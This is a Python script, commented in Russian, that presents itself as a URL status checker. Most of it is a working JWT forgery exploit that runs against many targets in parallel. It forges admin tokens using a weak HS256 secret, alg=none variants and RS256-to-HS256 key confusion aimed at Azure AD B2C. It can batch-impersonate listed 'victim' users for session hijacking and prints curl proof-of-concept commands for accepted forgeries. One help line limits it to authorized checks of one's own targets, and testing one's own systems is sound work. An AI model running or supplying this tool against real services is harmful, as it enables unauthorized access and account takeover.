#!/usr/bin/env python3
"""
Скрипт проверяет список URL-таргетов из файла:
- статус ответа должен быть 200 OK
- Content-Type должен быть application/json или text/plain
- тело ответа не должно быть пустым (0 байт)

Использование:
    python3 check_targets.py -f targets.txt
    python3 check_targets.py -f targets.txt -t 10 -w 20 -o results.json

Формат файла с таргетами: один URL на строку.
Пустые строки и строки, начинающиеся с '#', игнорируются.
"""

import argparse
import base64
import concurrent.futures
import hashlib
import hmac
import json
import secrets
import sys
from dataclasses import dataclass, asdict, field
from typing import Optional

import requests

ALLOWED_CONTENT_TYPES = ("application/json", "text/plain")
DEFAULT_JWT_PAYLOAD = {"sub": "admin", "user": "admin", "role": "admin", "admin": True}
ALG_NONE_CASES = ("none", "None", "NONE")  # некоторые парсеры сравнивают alg регистрозависимо

# Шаблон claims в стиле Azure AD B2C токена - используется с --jwt-azure-b2c,
# чтобы подделанный токен по структуре был похож на настоящий B2C-токен
AZURE_B2C_DEFAULT_PAYLOAD = {
    "iss": "https://login.microsoftonline.com/00000000-0000-0000-0000-000000000000/v2.0/",
    "exp": 9999999999,
    "nbf": 1000000000,
    "aud": "00000000-0000-0000-0000-000000000000",
    "sub": "00000000-0000-0000-0000-000000000000",
    "oid": "00000000-0000-0000-0000-000000000000",
    "tid": "00000000-0000-0000-0000-000000000000",
    "tfp": "B2C_1_signupsignin",
    "given_name": "Test",
    "family_name": "Admin",
    "name": "Test Admin",
    "emails": ["admin@example.com"],
    "idp": "local",
    "roles": ["admin"],
    "extension_Role": "admin",
    "ver": "1.0",
}


def parse_claim_overrides(claim_args: list[str]) -> dict:
    """Парсит список 'KEY=VALUE' из --jwt-claim в словарь claims.
    Значение пытается распарситься как JSON (числа, true/false, списки, объекты),
    если не получилось - остаётся строкой."""
    overrides = {}
    for item in claim_args:
        if "=" not in item:
            print(f"[!] Некорректный --jwt-claim (ожидается KEY=VALUE), пропущен: {item}", file=sys.stderr)
            continue
        key, raw_value = item.split("=", 1)
        key = key.strip()
        raw_value = raw_value.strip()
        try:
            value = json.loads(raw_value)
        except json.JSONDecodeError:
            value = raw_value
        overrides[key] = value
    return overrides


def read_identities(path: str) -> list[dict]:
    """Читает список 'жертв' (identity-claims) из JSON файла:
    [{"sub": "...", "oid": "...", "emails": ["..."], "name": "..."}, ...]
    Каждая запись мержится поверх базового payload и тестируется отдельно."""
    try:
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError) as e:
        print(f"[!] Не удалось прочитать --jwt-identities: {e}", file=sys.stderr)
        sys.exit(1)

    if not isinstance(data, list):
        print("[!] --jwt-identities должен быть JSON-массивом объектов claims", file=sys.stderr)
        sys.exit(1)

    for i, identity in enumerate(data):
        if not isinstance(identity, dict):
            print(f"[!] Элемент {i} в --jwt-identities не объект, пропущен", file=sys.stderr)

    return [d for d in data if isinstance(d, dict)]


def identity_label(identity: dict) -> str:
    """Короткая человекочитаемая метка личности для вывода в консоль/отчёт."""
    for key in ("emails", "email", "sub", "oid", "name", "user"):
        if key in identity:
            val = identity[key]
            if isinstance(val, list):
                val = val[0] if val else ""
            return str(val)
    return json.dumps(identity, ensure_ascii=False)[:40]


@dataclass
class CheckResult:
    url: str
    ok: bool
    status_code: Optional[int] = None
    content_type: Optional[str] = None
    body_size: Optional[int] = None
    error: Optional[str] = None
    reason: Optional[str] = None  # почему ok=False, если статус получен
    jwt_checks: list = field(default_factory=list)
    jwt_verdict: Optional[str] = None
    # "confirmed_vulnerable" — сервер валидирует JWT, но принял подделанный (secret/none/case)
    # "signature_not_validated" — сервер вообще не проверяет подпись (garbage-токен тоже принят)
    # "no_auth_required" — эндпоинт и без токена отдаёт 200 (авторизация не требуется вовсе)
    # "protected" — все подделанные токены отклонены
    # None — jwt-test не запускался


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def make_jwt_hs256(secret: str, payload: dict) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()
    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    return f"{header_b64}.{payload_b64}.{b64url_encode(sig)}"


def make_jwt_none(payload: dict, alg_value: str = "none") -> str:
    header = {"alg": alg_value, "typ": "JWT"}
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    # часть библиотек ожидает пустую подпись после точки, часть - вообще без неё
    return f"{header_b64}.{payload_b64}."


def make_jwt_garbage(payload: dict) -> str:
    """Токен с правильной структурой (HS256), но заведомо неверной подписью.
    Служит негативным контролем: если сервер принимает и его - значит,
    он вообще не проверяет подпись JWT, и дело не в слабом секрете."""
    header = {"alg": "HS256", "typ": "JWT"}
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    garbage_sig = b64url_encode(secrets.token_bytes(32))
    return f"{header_b64}.{payload_b64}.{garbage_sig}"


def make_jwt_rs256_confusion(rsa_public_key_pem: bytes, payload: dict) -> str:
    """Классическая атака RS256 -> HS256 key confusion.
    Актуальна для Azure AD B2C и любых токенов, изначально подписанных RS256:
    публичный RSA-ключ (он всегда публичен, доступен через /discovery/v2.0/keys
    или /.well-known/jwks.json) подставляется как HMAC-секрет. Если сервер не
    закрепляет жёстко ожидаемый алгоритм при верификации - подделка проходит,
    т.к. библиотека использует один и тот же ключ и для RS256, и для HS256."""
    header = {"alg": "HS256", "typ": "JWT"}
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()
    sig = hmac.new(rsa_public_key_pem, signing_input, hashlib.sha256).digest()
    return f"{header_b64}.{payload_b64}.{b64url_encode(sig)}"


def load_rsa_public_key(source: str, timeout: int = 10) -> bytes:
    """Загружает публичный RSA-ключ (PEM) из локального файла или по URL
    (например, прямая ссылка на JWKS-эндпоинт Azure B2C тенанта, если он
    уже сконвертирован в PEM - см. подсказку в --help)."""
    if source.startswith(("http://", "https://")):
        resp = requests.get(source, timeout=timeout)
        resp.raise_for_status()
        return resp.content
    with open(source, "rb") as f:
        return f.read()


@dataclass
class JwtCheck:
    kind: str
    delivery: str  # "bearer" | "cookie"
    token: str
    status_code: Optional[int] = None
    content_type: Optional[str] = None
    body_size: Optional[int] = None
    accepted: bool = False  # True = сервер вернул валидный ответ на подделанный токен -> вероятная уязвимость
    error: Optional[str] = None
    curl_poc: Optional[str] = None
    is_control: bool = False  # True = негативный контроль (garbage-подпись), не считается forged-успехом
    identity: Optional[str] = None  # метка личности, от имени которой подделан токен (batch-режим --jwt-identities)


def build_curl_poc(url: str, delivery: str, token: str, header_name: str, cookie_name: str) -> str:
    if delivery == "bearer":
        return f"curl -i -H '{header_name}: Bearer {token}' '{url}'"
    else:
        return f"curl -i -H 'Cookie: {cookie_name}={token}' '{url}'"


def run_jwt_checks(url: str, timeout: int, verify_ssl: bool, base_headers: dict,
                    secret: str, jwt_payload: dict, jwt_header_name: str,
                    jwt_cookie_name: str, rsa_pubkey_pem: Optional[bytes] = None,
                    identity: Optional[str] = None) -> list["JwtCheck"]:
    checks = []

    tokens = {
        "hs256_default_secret": (make_jwt_hs256(secret, jwt_payload), False),
    }
    for alg_case in ALG_NONE_CASES:
        tokens[f"alg_{alg_case}"] = (make_jwt_none(jwt_payload, alg_case), False)
    tokens["alg_none_empty_payload"] = (make_jwt_none({}), False)
    if rsa_pubkey_pem:
        tokens["rs256_to_hs256_confusion"] = (make_jwt_rs256_confusion(rsa_pubkey_pem, jwt_payload), False)
    # негативный контроль: правильная структура, заведомо неверная подпись
    tokens["garbage_signature"] = (make_jwt_garbage(jwt_payload), True)

    # Каждый токен пробуем двумя способами доставки: как Bearer в заголовке и как cookie
    delivery_modes = [
        ("bearer", {"headers": {jwt_header_name: "Bearer {token}"}}),
        ("cookie", {"cookies": {jwt_cookie_name: "{token}"}}),
    ]

    for kind, (token, is_control) in tokens.items():
        for mode_name, mode_conf in delivery_modes:
            headers = dict(base_headers)
            cookies = {}

            if "headers" in mode_conf:
                for h_name, h_val_tpl in mode_conf["headers"].items():
                    headers[h_name] = h_val_tpl.format(token=token)
            if "cookies" in mode_conf:
                for c_name, c_val_tpl in mode_conf["cookies"].items():
                    cookies[c_name] = c_val_tpl.format(token=token)

            try:
                resp = requests.get(url, timeout=timeout, verify=verify_ssl,
                                     headers=headers, cookies=cookies, allow_redirects=True)
            except requests.exceptions.RequestException as e:
                checks.append(JwtCheck(kind=kind, delivery=mode_name, token=token, error=str(e),
                                        is_control=is_control, identity=identity))
                continue

            content_type = resp.headers.get("Content-Type", "").split(";")[0].strip().lower()
            body_size = len(resp.content)
            accepted = (resp.status_code == 200 and content_type in ALLOWED_CONTENT_TYPES and body_size > 0)

            checks.append(JwtCheck(
                kind=kind, delivery=mode_name, token=token, status_code=resp.status_code,
                content_type=content_type, body_size=body_size, accepted=accepted, is_control=is_control,
                curl_poc=build_curl_poc(url, mode_name, token, jwt_header_name, jwt_cookie_name),
                identity=identity,
            ))

    return checks


def run_jwt_checks_multi_identity(url: str, timeout: int, verify_ssl: bool, base_headers: dict,
                                   secret: str, base_payload: dict, identities: list[dict],
                                   jwt_header_name: str, jwt_cookie_name: str,
                                   rsa_pubkey_pem: Optional[bytes] = None) -> list["JwtCheck"]:
    """Прогоняет полный набор JWT-подделок отдельно для каждой 'личности' из --jwt-identities,
    мержа её claims поверх base_payload. Позволяет проверить, можно ли подделать
    сессию под конкретных известных пользователей (session hijack / impersonation),
    а не только получить generic admin-доступ."""
    all_checks = []
    for identity in identities:
        merged_payload = {**base_payload, **identity}
        label = identity_label(identity)
        checks = run_jwt_checks(
            url, timeout, verify_ssl, base_headers, secret, merged_payload,
            jwt_header_name, jwt_cookie_name, rsa_pubkey_pem, identity=label,
        )
        all_checks.extend(checks)
    return all_checks




def classify_jwt_verdict(baseline_ok: bool, jwt_checks: list) -> str:
    """Определяет итоговый вердикт по JWT на основе всех проверок с учётом негативного контроля."""
    if baseline_ok:
        return "no_auth_required"

    garbage_accepted = any(jc.accepted for jc in jwt_checks if jc.is_control)
    if garbage_accepted:
        return "signature_not_validated"

    forged_accepted = any(jc.accepted for jc in jwt_checks if not jc.is_control)
    if forged_accepted:
        return "confirmed_vulnerable"

    return "protected"


def read_targets(path: str) -> list[str]:
    targets = []
    try:
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                # Если в файле нет схемы - добавим http:// по умолчанию
                if not line.startswith(("http://", "https://")):
                    line = "http://" + line
                targets.append(line)
    except FileNotFoundError:
        print(f"[!] Файл не найден: {path}", file=sys.stderr)
        sys.exit(1)
    return targets


def read_paths(path: str) -> list[str]:
    paths = []
    try:
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if not line.startswith("/"):
                    line = "/" + line
                paths.append(line)
    except FileNotFoundError:
        print(f"[!] Файл с путями не найден: {path}", file=sys.stderr)
        sys.exit(1)
    return paths


def build_urls(targets: list[str], paths: Optional[list[str]]) -> list[str]:
    """Комбинирует каждый таргет с каждым путём (если пути заданы)."""
    if not paths:
        return targets

    urls = []
    for target in targets:
        base = target.rstrip("/")
        for p in paths:
            urls.append(base + p)
    return urls


def check_target(url: str, timeout: int, method: str, verify_ssl: bool, headers: dict,
                  jwt_test: bool = False, jwt_secret: str = "secret",
                  jwt_payload: Optional[dict] = None, jwt_header_name: str = "Authorization",
                  jwt_cookie_name: str = "access_token",
                  jwt_rsa_pubkey_pem: Optional[bytes] = None,
                  jwt_identities: Optional[list] = None) -> CheckResult:
    try:
        resp = requests.request(
            method,
            url,
            timeout=timeout,
            verify=verify_ssl,
            headers=headers,
            allow_redirects=True,
        )
    except requests.exceptions.RequestException as e:
        return CheckResult(url=url, ok=False, error=str(e))

    status_code = resp.status_code
    content_type_raw = resp.headers.get("Content-Type", "")
    # Content-Type может содержать charset, например: application/json; charset=utf-8
    content_type = content_type_raw.split(";")[0].strip().lower()
    body_size = len(resp.content)
    baseline_ok = (status_code == 200 and content_type in ALLOWED_CONTENT_TYPES and body_size > 0)

    jwt_checks = []
    jwt_verdict = None
    if jwt_test:
        if jwt_identities:
            jwt_checks = run_jwt_checks_multi_identity(
                url, timeout, verify_ssl, headers, jwt_secret,
                jwt_payload or DEFAULT_JWT_PAYLOAD, jwt_identities,
                jwt_header_name, jwt_cookie_name, rsa_pubkey_pem=jwt_rsa_pubkey_pem,
            )
        else:
            jwt_checks = run_jwt_checks(
                url, timeout, verify_ssl, headers, jwt_secret,
                jwt_payload or DEFAULT_JWT_PAYLOAD, jwt_header_name, jwt_cookie_name,
                rsa_pubkey_pem=jwt_rsa_pubkey_pem,
            )
        jwt_verdict = classify_jwt_verdict(baseline_ok, jwt_checks)

    if status_code != 200:
        return CheckResult(
            url=url, ok=False, status_code=status_code,
            content_type=content_type, body_size=body_size,
            reason=f"статус {status_code} != 200", jwt_checks=jwt_checks, jwt_verdict=jwt_verdict,
        )

    if content_type not in ALLOWED_CONTENT_TYPES:
        return CheckResult(
            url=url, ok=False, status_code=status_code,
            content_type=content_type, body_size=body_size,
            reason=f"content-type '{content_type}' не входит в разрешённые {ALLOWED_CONTENT_TYPES}",
            jwt_checks=jwt_checks, jwt_verdict=jwt_verdict,
        )

    if body_size == 0:
        return CheckResult(
            url=url, ok=False, status_code=status_code,
            content_type=content_type, body_size=body_size,
            reason="тело ответа пустое (0 байт)", jwt_checks=jwt_checks, jwt_verdict=jwt_verdict,
        )

    return CheckResult(
        url=url, ok=True, status_code=status_code,
        content_type=content_type, body_size=body_size, jwt_checks=jwt_checks, jwt_verdict=jwt_verdict,
    )


def main():
    parser = argparse.ArgumentParser(description="Проверка таргетов на 200 OK, content-type и непустое тело")
    parser.add_argument("-f", "--file", required=True, help="Путь к файлу со списком таргетов (по одному URL/домену на строку)")
    parser.add_argument("-p", "--paths", help="Путь к файлу со списком путей (например index.html), которые будут по очереди подставляться к каждому таргету")
    parser.add_argument("-t", "--timeout", type=int, default=10, help="Таймаут запроса в секундах (по умолчанию 10)")
    parser.add_argument("-w", "--workers", type=int, default=10, help="Количество параллельных потоков (по умолчанию 10)")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "HEAD", "POST"], help="HTTP метод (по умолчанию GET; для HEAD тело обычно будет 0 байт)")
    parser.add_argument("-o", "--output", help="Путь для сохранения результатов в JSON")
    parser.add_argument("--no-verify-ssl", action="store_true", help="Отключить проверку SSL сертификатов")
    parser.add_argument("--header", action="append", default=[], help="Дополнительный заголовок вида 'Key: Value' (можно указывать несколько раз)")
    parser.add_argument("--fail-only", action="store_true", help="Выводить в консоль только неуспешные проверки")

    jwt_group = parser.add_argument_group("JWT-тестирование (только для авторизованных проверок собственных таргетов)")
    jwt_group.add_argument("--jwt-test", action="store_true", help="Проверить bypass через JWT: слабый секрет (HS256 'secret'), alg=none (в т.ч. регистровые варианты и пустой payload), плюс негативный контроль (мусорная подпись) для отсева ложных срабатываний")
    jwt_group.add_argument("--jwt-secret", default="secret", help="Секрет для подписи HS256 токена (по умолчанию 'secret')")
    jwt_group.add_argument("--jwt-payload", help="Путь к JSON файлу с claims для токена (по умолчанию {\"sub\":\"admin\",\"role\":\"admin\",\"admin\":true})")
    jwt_group.add_argument("--jwt-header-name", default="Authorization", help="Имя заголовка для Bearer-варианта (по умолчанию Authorization, значение будет 'Bearer <token>')")
    jwt_group.add_argument("--jwt-cookie-name", default="access_token", help="Имя cookie для cookie-варианта (по умолчанию access_token)")
    jwt_group.add_argument("--jwt-azure-b2c", action="store_true", help="Использовать payload в стиле Azure AD B2C токена (iss/aud/oid/tfp/emails и т.п.) как дефолтный, вместо generic payload. Игнорируется, если задан --jwt-payload")
    jwt_group.add_argument("--jwt-rsa-pubkey", help="Путь к файлу или URL публичного RSA-ключа (PEM) для атаки RS256->HS256 key confusion. "
                                                      "Актуально для Azure B2C и любых RS256-токенов: ключ всегда публичен "
                                                      "(доступен через .../discovery/v2.0/keys или /.well-known/jwks.json тенанта), "
                                                      "если JWKS отдаёт JWK (n/e), сконвертируйте в PEM заранее (например через python-jose/cryptography) и укажите путь к PEM-файлу")
    jwt_group.add_argument("--jwt-claim", action="append", default=[], metavar="KEY=VALUE",
                            help="Переопределить/добавить конкретный claim в payload (можно указывать несколько раз), "
                                 "например --jwt-claim oid=1111-2222 --jwt-claim emails='[\"victim@corp.com\"]'. "
                                 "Значение парсится как JSON, если не получилось - берётся как строка")
    jwt_group.add_argument("--jwt-identities", help="Путь к JSON-файлу со списком личностей для подделки сессии под конкретных пользователей: "
                                                      "[{\"sub\":\"...\",\"oid\":\"...\",\"emails\":[\"user@corp.com\"],\"name\":\"...\"}, ...]. "
                                                      "Каждая запись мержится поверх базового payload, и весь набор JWT-подделок "
                                                      "прогоняется отдельно для КАЖДОЙ личности - так проверяется session hijack "
                                                      "под произвольного пользователя, а не только generic admin-доступ. "
                                                      "ВНИМАНИЕ: сильно увеличивает число запросов (N личностей x 7 видов токена x 2 доставки на URL)")

    args = parser.parse_args()

    headers = {}
    for h in args.header:
        if ":" not in h:
            print(f"[!] Некорректный заголовок, пропущен: {h}", file=sys.stderr)
            continue
        key, value = h.split(":", 1)
        headers[key.strip()] = value.strip()

    jwt_payload = DEFAULT_JWT_PAYLOAD
    if args.jwt_azure_b2c:
        jwt_payload = AZURE_B2C_DEFAULT_PAYLOAD
    if args.jwt_payload:
        try:
            with open(args.jwt_payload, "r", encoding="utf-8") as f:
                jwt_payload = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError) as e:
            print(f"[!] Не удалось прочитать --jwt-payload: {e}", file=sys.stderr)
            sys.exit(1)

    if args.jwt_claim:
        overrides = parse_claim_overrides(args.jwt_claim)
        jwt_payload = {**jwt_payload, **overrides}
        print(f"[*] Claims переопределены через --jwt-claim: {list(overrides.keys())}")

    jwt_identities = None
    if args.jwt_identities:
        jwt_identities = read_identities(args.jwt_identities)
        print(f"[*] Загружено личностей для подделки сессии: {len(jwt_identities)}")

    jwt_rsa_pubkey_pem = None
    if args.jwt_rsa_pubkey:
        try:
            jwt_rsa_pubkey_pem = load_rsa_public_key(args.jwt_rsa_pubkey, args.timeout)
            print(f"[*] Публичный RSA-ключ загружен ({len(jwt_rsa_pubkey_pem)} байт), включаю проверку RS256->HS256 confusion")
        except Exception as e:
            print(f"[!] Не удалось загрузить --jwt-rsa-pubkey: {e}", file=sys.stderr)
            sys.exit(1)

    targets = read_targets(args.file)
    if not targets:
        print("[!] Список таргетов пуст.", file=sys.stderr)
        sys.exit(1)

    paths = read_paths(args.paths) if args.paths else None
    targets = build_urls(targets, paths)

    if paths:
        print(f"[*] Таргетов: {len(read_targets(args.file))} x путей: {len(paths)} = {len(targets)} URL. Запускаю проверку (потоков: {args.workers})...\n")
    else:
        print(f"[*] Загружено таргетов: {len(targets)}. Запускаю проверку (потоков: {args.workers})...\n")

    results: list[CheckResult] = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as executor:
        future_to_url = {
            executor.submit(
                check_target, url, args.timeout, args.method, not args.no_verify_ssl, headers,
                args.jwt_test, args.jwt_secret, jwt_payload, args.jwt_header_name, args.jwt_cookie_name,
                jwt_rsa_pubkey_pem, jwt_identities,
            ): url
            for url in targets
        }
        for future in concurrent.futures.as_completed(future_to_url):
            result = future.result()
            results.append(result)

            if args.fail_only and result.ok:
                continue

            if result.ok:
                print(f"[OK]   {result.url}  status={result.status_code} type={result.content_type} size={result.body_size}B")
            elif result.error:
                print(f"[ERR]  {result.url}  ошибка запроса: {result.error}")
            else:
                print(f"[FAIL] {result.url}  status={result.status_code} type={result.content_type} size={result.body_size}B — {result.reason}")

            for jc in result.jwt_checks:
                label = f"{jc.kind}/{jc.delivery}"
                if jc.identity:
                    label = f"identity={jc.identity} {label}"
                if jc.error:
                    print(f"       └─ JWT[{label}] ошибка: {jc.error}")
                elif jc.accepted:
                    tag = "[КОНТРОЛЬ принят]" if jc.is_control else "[!!! forged принят]"
                    print(f"       └─ {tag} JWT[{label}]: status={jc.status_code} type={jc.content_type} size={jc.body_size}B")
                    print(f"          PoC: {jc.curl_poc}")
                else:
                    print(f"       └─ JWT[{label}] отклонён: status={jc.status_code} type={jc.content_type} size={jc.body_size}B")

            if result.jwt_verdict:
                verdict_labels = {
                    "confirmed_vulnerable": "[!!! ПОДТВЕРЖДЕНО] сервер валидирует JWT, но принимает подделанный (слабый секрет / alg=none)",
                    "signature_not_validated": "[!] подпись JWT вообще не проверяется (принят даже случайный мусор)",
                    "no_auth_required": "[i] эндпоинт отдаёт 200 и без токена — авторизация не требуется вовсе",
                    "protected": "[OK] все подделанные токены отклонены",
                }
                print(f"       └─ ВЕРДИКТ: {verdict_labels.get(result.jwt_verdict, result.jwt_verdict)}")

    ok_count = sum(1 for r in results if r.ok)
    fail_count = len(results) - ok_count
    print(f"\n[*] Итого: {len(results)} | успешно: {ok_count} | провалено: {fail_count}")

    if args.jwt_test:
        confirmed = [r for r in results if r.jwt_verdict == "confirmed_vulnerable"]
        no_sig_check = [r for r in results if r.jwt_verdict == "signature_not_validated"]
        no_auth = [r for r in results if r.jwt_verdict == "no_auth_required"]
        protected = [r for r in results if r.jwt_verdict == "protected"]

        print(f"\n[*] JWT-вердикты: подтверждено уязвимых={len(confirmed)} | подпись не проверяется={len(no_sig_check)} | без авторизации={len(no_auth)} | защищено={len(protected)}")

        if confirmed:
            print(f"\n[!!!] ПОДТВЕРЖДЕНО: сервер валидирует JWT, но принимает подделанный ({len(confirmed)}):")
            for r in confirmed:
                for jc in r.jwt_checks:
                    if jc.accepted and not jc.is_control:
                        identity_part = f"  identity={jc.identity}" if jc.identity else ""
                        print(f"      - {r.url}  [{jc.kind}/{jc.delivery}]{identity_part}")
                        print(f"        PoC: {jc.curl_poc}")

        if no_sig_check:
            print(f"\n[!] Подпись JWT вообще не проверяется (принят даже мусорный токен) ({len(no_sig_check)}):")
            for r in no_sig_check:
                print(f"      - {r.url}")
                for jc in r.jwt_checks:
                    if jc.accepted and jc.is_control:
                        print(f"        PoC (мусорная подпись всё равно принята): {jc.curl_poc}")

        if no_auth:
            print(f"\n[i] Эндпоинты без авторизации вовсе (200 и без токена) ({len(no_auth)}):")
            for r in no_auth:
                print(f"      - {r.url}")
                print(f"        PoC (без токена вообще): curl -i '{r.url}'")

    if args.output:
        # сохраняем в исходном порядке файла
        order = {url: i for i, url in enumerate(targets)}
        results_sorted = sorted(results, key=lambda r: order.get(r.url, 0))
        with open(args.output, "w", encoding="utf-8") as f:
            json.dump([asdict(r) for r in results_sorted], f, ensure_ascii=False, indent=2)
        print(f"[*] Результаты сохранены в {args.output}")

    sys.exit(0 if fail_count == 0 else 2)


if __name__ == "__main__":
    main()
